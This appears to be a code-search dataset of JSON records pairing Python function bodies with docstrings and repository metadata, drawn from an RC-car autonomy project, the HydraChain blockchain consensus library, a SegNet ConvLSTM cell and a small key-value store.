{"docstring": "\"\"\"Convolutional Long short-term memory cell (ConvLSTM).\"\"\"\n", "func_signal": "def __call__(self, inputs, state, scope=None):\n", "code": "with vs.variable_scope(scope or type(self).__name__): # \"ConvLSTMCell\"\n  if self._state_is_tuple:\n    c, h = state\n  else:\n    c, h = array_ops.split(3, 2, state)\n\n  # batch_size * height * width * channel\n  concat = _conv([inputs, h], 4 * self._num_units, self._k_size, True, initializer=self._initializer)\n\n  # i = input_gate, j = new_input, f = forget_gate, o = output_gate\n  i, j, f, o = array_ops.split(3, 4, concat)\n\n  new_c = (c * sigmoid(f + self._forget_bias) + sigmoid(i) *\n           self._activation(j))\n  new_h = self._activation(new_c) * sigmoid(o)\n\n  if self._state_is_tuple:\n    new_state = LSTMStateTuple(new_c, new_h)\n  else:\n    new_state = array_ops.concat(3, [new_c, new_h])\n  return new_h, new_state", "path": "convLSTM.py", "repo_name": "tkuanlun350/Tensorflow-SegNet", "stars": 365, "license": "mit", "language": "python", "size": 116}
{"docstring": "\"\"\"Set mode to Left\"\"\"\n", "func_signal": "def set_left_mode():\n", "code": "GPIO.output(FRONT_MOTOR_DATA_ONE, False)\nGPIO.output(FRONT_MOTOR_DATA_TWO, True)", "path": "helpers\\motor_driver.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Main function\"\"\"\n", "func_signal": "def main():\n", "code": "model = None\nif len(sys.argv) > 1:\n    model = sys.argv[1]\nmotor_driver_helper.set_gpio_pins()\nautonomous_control(model)", "path": "autonomous.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Save the model\"\"\"\n", "func_signal": "def save_model(hidden_layer_size, optimized_theta, lambda_value):\n", "code": "model = {'hidden_layer_size': hidden_layer_size, 'optimized_theta': optimized_theta,\n         'lambda_value': lambda_value}\ntimestamp = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d_%H-%M-%S')\nlambda_value_and_hidden_layers = \"_l\" + str(lambda_value) + \"_h\" + str(hidden_layer_size)\ntimestamp_with_lambda_value = timestamp + lambda_value_and_hidden_layers\nmodel_filename = \"model_\" + timestamp_with_lambda_value + \".pkl\"\nwith open(\"optimized_thetas/\" + model_filename, 'wb') as output_file:\n    pickle.dump(model, output_file, pickle.HIGHEST_PROTOCOL)", "path": "train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Returns a tuple of (UP, DOWN, LEFT, RIGHT, change, ACCELERATE,\nDECELERATE, stop) representing which keys are UP or DOWN and\nwhether or not the key states changed.\n\"\"\"\n", "func_signal": "def get_keys():\n", "code": "change = False\nstop = False\nkey_to_global_name = {\n    pygame.K_LEFT: 'LEFT',\n    pygame.K_RIGHT: 'RIGHT',\n    pygame.K_UP: 'UP',\n    pygame.K_DOWN: 'DOWN',\n    pygame.K_ESCAPE: 'QUIT',\n    pygame.K_q: 'QUIT',\n    pygame.K_w: 'ACCELERATE',\n    pygame.K_s: 'DECELERATE'\n}\nfor event in pygame.event.get():\n    if event.type in {pygame.K_q, pygame.K_ESCAPE}:\n        stop = True\n    elif event.type in {pygame.KEYDOWN, pygame.KEYUP}:\n        down = (event.type == pygame.KEYDOWN)\n        change = (event.key in key_to_global_name)\n        if event.key in key_to_global_name:\n            globals()[key_to_global_name[event.key]] = down\nreturn (UP, DOWN, LEFT, RIGHT, change, ACCELERATE, DECELERATE, stop)", "path": "interactive_control_train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Set mode to Right\"\"\"\n", "func_signal": "def set_right_mode():\n", "code": "GPIO.output(FRONT_MOTOR_DATA_ONE, True)\nGPIO.output(FRONT_MOTOR_DATA_TWO, False)", "path": "helpers\\motor_driver.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Main function\"\"\"\n", "func_signal": "def main():\n", "code": "motor_driver_helper.set_gpio_pins()\ninteractive_control()", "path": "interactive_control_train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Sets the GPIO pins for the two motors\"\"\"\n", "func_signal": "def set_gpio_pins():\n", "code": "GPIO.setmode(GPIO.BCM)\nGPIO.setup(BACK_MOTOR_DATA_ONE, GPIO.OUT)\nGPIO.setup(BACK_MOTOR_DATA_TWO, GPIO.OUT)\nGPIO.setup(FRONT_MOTOR_DATA_ONE, GPIO.OUT)\nGPIO.setup(FRONT_MOTOR_DATA_TWO, GPIO.OUT)\nGPIO.setup(BACK_MOTOR_ENABLE_PIN, GPIO.OUT)", "path": "helpers\\motor_driver.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Sets the Front motor to Idle state\"\"\"\n", "func_signal": "def set_front_motor_to_idle():\n", "code": "GPIO.output(FRONT_MOTOR_DATA_ONE, True)\nGPIO.output(FRONT_MOTOR_DATA_TWO, True)", "path": "helpers\\motor_driver.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Increase speed based on the turn count\"\"\"\n", "func_signal": "def increase_speed_on_turn(pwm, turn_count):\n", "code": "turn_count = turn_count + 1\nif turn_count > 4:\n    print(\"Speed Increased\")\n    motor_driver_helper.change_pwm_duty_cycle(pwm, 100)\nelse:\n    motor_driver_helper.change_pwm_duty_cycle(pwm, 85)\nreturn turn_count", "path": "autonomous.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Gradient\"\"\"\n", "func_signal": "def gradients(gradient_parameters):\n", "code": "theta = gradient_parameters['theta']\ninput_layer_size = gradient_parameters['input_layer_size']\nhidden_layer_size = gradient_parameters['hidden_layer_size']\nnumber_of_labels = gradient_parameters['number_of_labels']\nx_values = gradient_parameters['x_values']\ny_values = gradient_parameters['y_values']\nlambda_value = gradient_parameters['lambda_value']\n\ntheta_1_params = theta[0: (hidden_layer_size * (input_layer_size + 1))]\ntheta_2_params = theta[(hidden_layer_size * (input_layer_size + 1)):]\n\ntheta_1 = theta_1_params.reshape(hidden_layer_size, input_layer_size + 1)\ntheta_2 = theta_2_params.reshape(number_of_labels, (hidden_layer_size + 1))\n\ninput_examples_size = x_values.shape[0]\n\nhidden_layer_input = numpy.c_[numpy.ones(input_examples_size), x_values].dot(theta_1.T)\nhidden_layer_output = sigmoid(hidden_layer_input)\n\noutput_layer_input = numpy.c_[numpy.ones(hidden_layer_output.shape[0]), hidden_layer_output].dot(theta_2.T)\noutput = sigmoid(output_layer_input)\n\nerrors = output - y_values\nbackpropagated_errors = errors.dot(theta_2[:, 1:]) * sigmoid_gradient(hidden_layer_input)\n\ndelta_1 = backpropagated_errors.T.dot(numpy.c_[numpy.ones(input_examples_size), x_values])\ndelta_2 = errors.T.dot(numpy.c_[numpy.ones(hidden_layer_output.shape[0]), hidden_layer_output])\n\ntheta_1[:, 0] = 0\ntheta_2[:, 0] = 0\n\ntheta_1_gradient = ((1.0 / input_examples_size) * delta_1) + ((lambda_value / input_examples_size) * theta_1)\ntheta_2_gradient = ((1.0 / input_examples_size) * delta_2) + ((lambda_value / input_examples_size) * theta_2)\n\ngradient = numpy.append(theta_1_gradient.flatten(), theta_2_gradient.flatten())\nreturn gradient", "path": "cost_function.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Prepare function parameters using input and training parameters\"\"\"\n", "func_signal": "def prepare_function_parameters(input_parameters, training_parameters):\n", "code": "function_parameters = {}\nfunction_parameters = input_parameters.copy()\nfunction_parameters.update(training_parameters)\nreturn function_parameters", "path": "train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Set mode to Forward\"\"\"\n", "func_signal": "def set_forward_mode():\n", "code": "GPIO.output(BACK_MOTOR_DATA_ONE, True)\nGPIO.output(BACK_MOTOR_DATA_TWO, False)", "path": "helpers\\motor_driver.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Main function\"\"\"\n", "func_signal": "def main():\n", "code": "lambda_value = LAMBDA\nhidden_layer_size = HIDDEN_LAYER_SIZE\ntry:\n    lambda_value = float(sys.argv[1])\n    hidden_layer_size = int(sys.argv[2])\nexcept(NameError, IndexError):\n    print(\"Unspecified Lambda value and hidden layer size\")\nimage_array, image_values = load_images_to_array(CLASSIFICATION_LABELS_AND_VALUES)\nnumber_of_labels = len(CLASSIFICATION_LABELS)\nx_values = image_array[1:, :]\ny_values = image_values[1:, :]\ninput_layer_size = x_values.shape[1]\ninitial_theta = initialize_theta(input_layer_size, hidden_layer_size,\n                                 number_of_labels)\ninput_parameters = prepare_input_parameters(input_layer_size,\n                                            hidden_layer_size,\n                                            number_of_labels,\n                                            lambda_value)\ntraining_parameters = prepare_training_parameters(x_values, y_values)\nfunction_parameters = prepare_function_parameters(input_parameters,\n                                                  training_parameters)\n(optimized_theta, function_min_value, info_dict) = minimize_cost_function(initial_theta,\n                                                                          function_parameters)\nprint(function_min_value)\nprint(info_dict)\nsave_model(hidden_layer_size, optimized_theta, lambda_value)", "path": "train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Runs the interactive control\"\"\"\n", "func_signal": "def interactive_control():\n", "code": "setup_interactive_control()\nclock = pygame.time.Clock()\nwith picamera.PiCamera() as camera:\n    camera.resolution = configuration.PICAMERA_RESOLUTION\n    camera.framerate = configuration.PICAMERA_FRAMERATE\n    time.sleep(configuration.PICAMERA_WARM_UP_TIME)\n    # GPIO.output(BACK_MOTOR_ENABLE_PIN, True)\n    pwm = motor_driver_helper.get_pwm_imstance()\n    motor_driver_helper.start_pwm(pwm)\n    command = 'idle'\n    duty_cycle = configuration.INITIAL_PWM_DUTY_CYCLE\n    while True:\n        up_key, down, left, right, change, accelerate, decelerate, stop = get_keys()\n        if stop:\n            break\n        if accelerate:\n            duty_cycle = duty_cycle + 3 if (duty_cycle + 3) <= 100 else duty_cycle\n            motor_driver_helper.change_pwm_duty_cycle(pwm, duty_cycle)\n            print(\"speed: \" + str(duty_cycle))\n        if decelerate:\n            duty_cycle = duty_cycle - 3 if (duty_cycle - 3) >= 0 else duty_cycle\n            motor_driver_helper.change_pwm_duty_cycle(pwm, duty_cycle)\n            print(\"speed: \" + str(duty_cycle))\n        if change:\n            command = 'idle'\n            motor_driver_helper.set_idle_mode()\n            if up_key:\n                command = 'forward'\n                print(duty_cycle)\n                motor_driver_helper.set_forward_mode()\n            elif down:\n                command = 'reverse'\n                motor_driver_helper.set_reverse_mode()\n\n            append = lambda x: command + '_' + x if command != 'idle' else x\n\n            if left:\n                command = append('left')\n                motor_driver_helper.set_left_mode()\n            elif right:\n                command = append('right')\n                motor_driver_helper.set_right_mode()\n        print(command)\n        stream = io.BytesIO()\n        camera.capture(stream, format='jpeg', use_video_port=True)\n        image_helper.save_image_with_direction(stream, command)\n        stream.flush()\n\n        clock.tick(30)\n    pygame.quit()", "path": "interactive_control_train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Cost function\"\"\"\n", "func_signal": "def cost_function(cost_function_parameters):\n", "code": "theta = cost_function_parameters['theta']\ninput_layer_size = cost_function_parameters['input_layer_size']\nhidden_layer_size = cost_function_parameters['hidden_layer_size']\nnum_labels = cost_function_parameters['number_of_labels']\nx_values = cost_function_parameters['x_values']\ny_values = cost_function_parameters['y_values']\nlambda_value = cost_function_parameters['lambda_value']\n\ntheta_1_parameters = theta[0: (hidden_layer_size * (input_layer_size + 1))]\ntheta_2_parameters = theta[(hidden_layer_size * (input_layer_size + 1)):]\n\ntheta_1 = theta_1_parameters.reshape(hidden_layer_size, input_layer_size + 1)\ntheta_2 = theta_2_parameters.reshape(num_labels, (hidden_layer_size + 1))\n\ninput_examples_size = x_values.shape[0]\n\nhidden_layer_input = numpy.c_[numpy.ones(input_examples_size), x_values].dot(theta_1.T)\nhidden_layer_output = sigmoid(hidden_layer_input)\n\noutput_layer_input = numpy.c_[numpy.ones(hidden_layer_output.shape[0]), hidden_layer_output].dot(theta_2.T)\noutput = sigmoid(output_layer_input)\n\nfirst_part_of_cost = -((y_values) * numpy.log(output))\nsecond_part_of_cost = ((1.0 - y_values) * numpy.log(1.0-output))\n\ncombined_thetas = numpy.append(theta_1.flatten()[1:], theta_2.flatten()[1:])\nregularization_term = (lambda_value/(2.0 * input_examples_size)) * numpy.sum(numpy.power(combined_thetas, 2))\n\nj = ((1.0/input_examples_size) * numpy.sum(numpy.sum(first_part_of_cost - second_part_of_cost))) + regularization_term\nreturn j", "path": "cost_function.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Reduce speed based on the turn count\"\"\"\n", "func_signal": "def reduce_speed(pwm, turn_count):\n", "code": "turn_count = turn_count + 1\nif turn_count < 3:\n    motor_driver_helper.change_pwm_duty_cycle(pwm, 100)\nelse:\n    print(\"Speed reduced - Forward\")\n    motor_driver_helper.change_pwm_duty_cycle(pwm, 85)\nreturn turn_count", "path": "autonomous.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Loads images to array\"\"\"\n", "func_signal": "def load_images_to_array(classification_label_and_values):\n", "code": "training_image_array = array([zeros(IMAGE_DIMENSIONS[0] * IMAGE_DIMENSIONS[1])])\ntraining_image_value = array([[0, 0, 0, 0, 0]])\nprint(\"Loading images to array...\")\nfor class_label, class_value in classification_label_and_values.iteritems():\n    for filename in glob.glob(\"./\"+class_label+\"/*\"):\n        image_array = imread(filename, flatten=True)\n        resized_image_array = imresize(image_array, IMAGE_DIMENSIONS)\n        training_image_array = r_[training_image_array, [resized_image_array.flatten()]]\n        training_image_value = r_[training_image_value, [class_value]]\nreturn (training_image_array, training_image_value)", "path": "train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Prepare training parameters\"\"\"\n", "func_signal": "def prepare_training_parameters(x_values, y_values):\n", "code": "training_parameters = {}\ntraining_parameters['x_values'] = x_values\ntraining_parameters['y_values'] = y_values\nreturn training_parameters", "path": "train.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Run the car autonomously\"\"\"\n", "func_signal": "def autonomous_control(model):\n", "code": "predictor = Predictor(model)\nwith picamera.PiCamera() as camera:\n    camera.resolution = configuration.PICAMERA_RESOLUTION\n    camera.framerate = configuration.PICAMERA_FRAMERATE\n    time.sleep(configuration.PICAMERA_WARM_UP_TIME)\n    pwm = motor_driver_helper.get_pwm_imstance()\n    motor_driver_helper.start_pwm(pwm)\n    forward_cycle_count = left_cycle_count = right_cycle_count = 0\n    should_brake = False\n\n    while True:\n        stream = io.BytesIO()\n        camera.capture(stream, format='jpeg', use_video_port=True)\n        direction = predictor.predict(stream)\n        image_helper.save_image_with_direction(stream, direction)\n        stream.flush()\n        if direction == 'forward':\n            should_brake = True\n            left_cycle_count = right_cycle_count = 0\n            forward_cycle_count = reduce_speed(pwm, forward_cycle_count)\n            motor_driver_helper.set_front_motor_to_idle()\n            motor_driver_helper.set_forward_mode()\n        elif direction == 'left':\n            should_brake = True\n            forward_cycle_count = right_cycle_count = 0\n            left_cycle_count = increase_speed_on_turn(pwm, left_cycle_count)\n            motor_driver_helper.set_left_mode()\n            motor_driver_helper.set_forward_mode()\n        elif direction == 'right':\n            should_brake = True\n            forward_cycle_count = left_cycle_count = 0\n            right_cycle_count = increase_speed_on_turn(pwm, right_cycle_count)\n            motor_driver_helper.set_right_mode()\n            motor_driver_helper.set_forward_mode()\n        elif direction == 'reverse':\n            should_brake = True\n            motor_driver_helper.set_front_motor_to_idle()\n            motor_driver_helper.set_reverse_mode()\n        else:\n            if should_brake:\n                print(\"braking...\")\n                motor_driver_helper.set_reverse_mode()\n                time.sleep(0.2)\n                should_brake = False\n            motor_driver_helper.set_idle_mode()\n            forward_cycle_count = left_cycle_count = right_cycle_count = 0\n            motor_driver_helper.change_pwm_duty_cycle(pwm, 100)\n        print(direction)", "path": "autonomous.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "\"\"\"Set mode to Idle\"\"\"\n", "func_signal": "def set_idle_mode():\n", "code": "set_back_motor_to_idle()\nset_front_motor_to_idle()", "path": "helpers\\motor_driver.py", "repo_name": "multunus/autonomous-rc-car", "stars": 299, "license": "mit", "language": "python", "size": 18}
{"docstring": "# create bootstrap node priv_key and enode\n", "func_signal": "def get_bootstrap_node(seed, base_port=29870, host=b'0.0.0.0'):\n", "code": "bootstrap_node_privkey = mk_privkey('%d:udp:%d' % (seed, 0))\nbootstrap_node_pubkey = privtopub_raw(bootstrap_node_privkey)\nreturn host_port_pubkey_to_uri(host, base_port, bootstrap_node_pubkey)", "path": "hydrachain\\app.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# valid block proposal on currrent height\n", "func_signal": "def last_blockproposal(self):\n", "code": "p = self.heights[self.height].last_voted_blockproposal\nif p:\n    return p\nelif self.height > 1:  # or last block\n    return self.get_blockproposal(self.head.hash)", "path": "hydrachain\\consensus\\manager.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# bootstrap scenario\n\n# this works without repeated VoteNil sending, as the first node will\n# eventually collect a valid Lockset.\n# if:\n# nodes can request proposals, they missed\n# the network is not disjoint at the beginning\n\n# solution:\n#   send current and last valid lockset and proposal with status\n\n", "func_signal": "def test_successive_joining():\n", "code": "network = Network(num_nodes=10, simenv=True)\n\n# disable nodes, i.e. they won't connect yet\nfor n in network.nodes:\n    n.isactive = False\n\nfor n in network.nodes:\n    n.isactive = True\n    network.connect_nodes()\n    network.start()\n    network.run(2)\nnetwork.run(2)\n\nr = network.check_consistency()\nassert_heightdistance(r)", "path": "hydrachain\\tests\\test_sim_syncing.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"compute (height,round)\nWe might have multiple rounds before we see consensus for a certain height.\nIf everything is good, round should always be 0.\n\"\"\"\n", "func_signal": "def hr(self):\n", "code": "assert len(self), 'no votes, can not determine height'\nh = set([(v.height, v.round) for v in self.votes])\nassert len(h) == 1, len(h)\nreturn h.pop()", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# double check unmutable\n", "func_signal": "def sender(self):\n", "code": "s = super(BlockProposal, self).sender\nif not s:\n    raise InvalidProposalError('signature missing')\nassert self.rawhash\nassert self.v\n_rawhash = sha3(rlp.encode(self, self.__class__.exclude(['v', 'r', 's'])))\nassert self.rawhash == _rawhash\nassert len(s) == 20\nassert len(self.block.header.coinbase) == 20\nif s != self.block.header.coinbase:\n    raise InvalidProposalError('signature does not match coinbase')\nreturn s", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"\nless than 1/3 of the known votes are on the same block\n\"\"\"\n", "func_signal": "def has_noquorum(self):\n", "code": "assert self.is_valid\nbhs = self.blockhashes()\nif not bhs or bhs[0][1] <= 1 / 3. * self.num_eligible_votes:\n    assert not self.has_quorum_possible\n    return True", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"\nsync the missing blocks between:\n    head\n    highest height with signing lockset\n\nwe get these locksets by collecting votes on all heights\n\"\"\"\n", "func_signal": "def request(self):\n", "code": "missing = self.missing\nself.cm.log('sync.request', missing=len(missing), requested=len(self.requested),\n            received=len(self.received))\nif self.requested:\n    self.cm.log('waiting for requested')\n    return\nif len(self.received) + self.max_getproposals_count >= self.max_queued:\n    self.cm.log('queue is full')\n    return\nif not missing:\n    self.cm.log('insync')\n    return\nif self.last_active_protocol is None:  # FIXME, check if it is active\n    self.cm.log('no active protocol', last_active_protocol=self.last_active_protocol)\n    return\nself.cm.log('collecting')\nblocknumbers = []\nfor h in missing:\n    if h not in self.received and h not in self.requested:\n        blocknumbers.append(h)\n        self.requested.add(h)\n        if len(blocknumbers) == self.max_getproposals_count:\n            break\nself.cm.log('collected', num=len(blocknumbers))\nif not blocknumbers:\n    return\nself.cm.log('requesting', num=len(blocknumbers),\n            requesting_range=(blocknumbers[0], blocknumbers[-1]))\nself.last_active_protocol.send_getblockproposals(*blocknumbers)\n# setup alarm\nself.cm.chainservice.setup_alarm(self.timeout, self.on_alarm, blocknumbers)", "path": "hydrachain\\consensus\\synchronizer.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"\nwe've seen +1/3 of all eligible votes voting for one block.\nat least one vote was from a honest node.\nwe can assume that this block is agreeable.\n\"\"\"\n", "func_signal": "def has_quorum_possible(self):\n", "code": "if self.has_quorum:\n    return\nassert self.is_valid  # we could tell that earlier\nbhs = self.blockhashes()\nif bhs and bhs[0][1] > 1 / 3. * self.num_eligible_votes:\n    return bhs[0][0]", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"In this test, we spawn a network with a number of\n`validators` validator nodes, where a number of `late` nodes stay\noffline until after a certain delay:\n\n>>> initial sync_time = delay * (validators - late)\n\nNow the \"late-joiners\" come online and we let them sync until\nthe networks head block is at `num_initial_blocks` (default: 10).\n\nSince in some configurations the late-joiners don't manage to catch up\nat that point, we inject a transaction (leading to a new block) into\nthe now fully online network.\n\nNow all nodes must be at the same block-height: `(num_initial_blocks + 1)`.\n\"\"\"\n", "func_signal": "def test_late_joins(validators, late, delay):\n", "code": "network = Network(num_nodes=validators, simenv=True)\nfor node in network.nodes[validators - late:]:\n    node.isactive = False\nnetwork.connect_nodes()\nnetwork.normvariate_base_latencies()\nnetwork.start()\nnetwork.run(delay * (validators - late))\nfor node in network.nodes[validators - late:]:\n    node.isactive = True\nnetwork.connect_nodes()\nnetwork.normvariate_base_latencies()\nnetwork.start()\nnetwork.run(max(10, validators * delay))\n\nr = network.check_consistency()\n\n# now majority must be at block 10\n# late-joiners may be at block 9 or even still at block 0\nassert_heightdistance(r, max_distance=10)\nassert r['heights'][10] >= (validators - late)\n\n# after a new block, all nodes should be up-to-date:\nchainservice = network.nodes[0].services.chainservice\n\nsender = chainservice.chain.coinbase\nto = 'x' * 20\nnonce = chainservice.chain.head.get_nonce(sender)\ngas = 21000\ngasprice = 1\nvalue = 1\nassert chainservice.chain.head.get_balance(sender) > gas * gasprice + value\ntx = Transaction(nonce, gasprice, gas, to, value, data='')\nnetwork.nodes[0].services.accounts.sign_tx(sender, tx)\nassert tx.sender == sender\n\nsuccess = chainservice.add_transaction(tx)\nassert success\n\n# run in ever longer bursts until we're at height 11\nfor i in range(1, 10):\n    network.connect_nodes()\n    network.normvariate_base_latencies()\n    network.start()\n    network.run(2 * i)\n    r = network.check_consistency()\n    if r['heights'][11] == validators:\n        break\n\nassert_heightdistance(r)\nassert r['heights'][11] == validators", "path": "hydrachain\\tests\\test_sim_joins.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# required by P2PProtocol\n", "func_signal": "def __init__(self, peer, service):\n", "code": "self.config = peer.config\nBaseProtocol.__init__(self, peer, service)", "path": "hydrachain\\consensus\\protocol.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# remove requested, so they can be rerequested\n", "func_signal": "def on_alarm(self, requested):\n", "code": "self.requested.difference_update(set(self.requested))\nself.request()", "path": "hydrachain\\consensus\\synchronizer.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# convert to dict\n", "func_signal": "def decode_payload(cls, rlp_data):\n", "code": "txs = []\nfor i, tx in enumerate(rlp.decode_lazy(rlp_data)):\n    txs.append(Transaction.deserialize(tx))\n    if not i % 10:\n        gevent.sleep(0.0001)\nreturn txs", "path": "hydrachain\\consensus\\protocol.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"\nin order to avoid a complicated bootstrapping, we define\nthe genesis_signing_lockset as a lockset with one vote by any validator.\n\"\"\"\n", "func_signal": "def genesis_signing_lockset(genesis, privkey):\n", "code": "v = VoteBlock(0, 0, genesis.hash)\nv.sign(privkey)\nls = LockSet(num_eligible_votes=1)\nls.add(v)\nassert ls.has_quorum\nreturn ls", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# if self.coinbase != 0: return\n", "func_signal": "def log(self, tag, **kargs):\n", "code": "t = int(self.chainservice.now)\nc = lambda x: cstr(self.coinbase, x)\nmsg = ' '.join([str(t), c(repr(self)), tag, (' %r' % kargs if kargs else '')])\nlog.debug(msg)", "path": "hydrachain\\consensus\\manager.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"Sign this with a private key\"\"\"\n", "func_signal": "def sign(self, privkey):\n", "code": "if self.v:\n    raise InvalidSignature(\"already signed\")\n\nif privkey in (0, '', '\\x00' * 32):\n    raise InvalidSignature(\"Zero privkey cannot sign\")\nrawhash = sha3(rlp.encode(self, self.__class__.exclude(['v', 'r', 's'])))\n\nif len(privkey) == 64:\n    privkey = encode_privkey(privkey, 'bin')\n\npk = PrivateKey(privkey, raw=True)\nsignature = pk.ecdsa_recoverable_serialize(pk.ecdsa_sign_recoverable(rawhash, raw=True))\n\nsignature = signature[0] + chr(signature[1])\n\nself.v = ord(signature[64]) + 27\nself.r = big_endian_to_int(signature[0:32])\nself.s = big_endian_to_int(signature[32:64])\n\nself._sender = None\nreturn self", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# wait for interrupt\n", "func_signal": "def serve_until_stopped(*apps):\n", "code": "evt = Event()\ngevent.signal(signal.SIGQUIT, evt.set)\ngevent.signal(signal.SIGTERM, evt.set)\nevt.wait()\n# finally stop\nfor app in apps:\n    app.stop()", "path": "hydrachain\\app.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"\nwe've seen +2/3 of all eligible votes voting for one block.\nthere is a quorum.\n\"\"\"\n", "func_signal": "def has_quorum(self):\n", "code": "assert self.is_valid\nbhs = self.blockhashes()\nif bhs and bhs[0][1] > 2 / 3. * self.num_eligible_votes:\n    return bhs[0][0]", "path": "hydrachain\\consensus\\base.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# create multiple nac instances and assert they are different contracts\n", "func_signal": "def test_nac_instances():\n", "code": "state = tester.state()\nnc.registry.register(SampleNAC)\n\na0 = nc.tester_create_native_contract_instance(state, tester.k0, SampleNAC)\na1 = nc.tester_create_native_contract_instance(state, tester.k0, SampleNAC)\na2 = nc.tester_create_native_contract_instance(state, tester.k0, SampleNAC)\n\nassert a0 != a1 != a2\nassert len(a0) == 20\n\n# create proxies\nc0 = nc.tester_nac(state, tester.k0, a0)\nc1 = nc.tester_nac(state, tester.k0, a1)\nc2 = nc.tester_nac(state, tester.k0, a2)\n\nassert c0.get_address() == a0\nassert c1.get_address() == a1\nassert c2.get_address() == a2\n\nassert c0.afunc(5, 6) == 30\nassert c0.efunc([4, 8]) == 32\nnc.registry.unregister(SampleNAC)", "path": "hydrachain\\tests\\test_native_contracts.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "# create multiple nac instances and assert they are different contracts\n", "func_signal": "def test_events():\n", "code": "state = tester.state()\nnc.registry.register(EventNAC)\n\n# create proxies\nnc.listen_logs(state, Shout)\nc0 = nc.tester_nac(state, tester.k0, EventNAC.address)\nc0.afunc(1, 2)", "path": "hydrachain\\tests\\test_native_contracts.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\"\nrlp data directly from the database\n\"\"\"\n", "func_signal": "def encode_payload(cls, list_of_rlp):\n", "code": "assert isinstance(list_of_rlp, tuple)\nassert not list_of_rlp or isinstance(list_of_rlp[0], bytes)\nreturn rlp.encode([rlp.codec.RLPData(x) for x in list_of_rlp], infer_serializer=False)", "path": "hydrachain\\consensus\\protocol.py", "repo_name": "HydraChain/hydrachain", "stars": 365, "license": "mit", "language": "python", "size": 321}
{"docstring": "\"\"\" Set the value of key to the value given. \"\"\"\n\n", "func_signal": "def __setitem__(self, key, value):\n", "code": "key = dumps(key)\nvalue = dumps(value)\nself.data[key] = value", "path": "simpledb.py", "repo_name": "JosephSalisbury/python-bittorrent", "stars": 301, "license": "None", "language": "python", "size": 283}
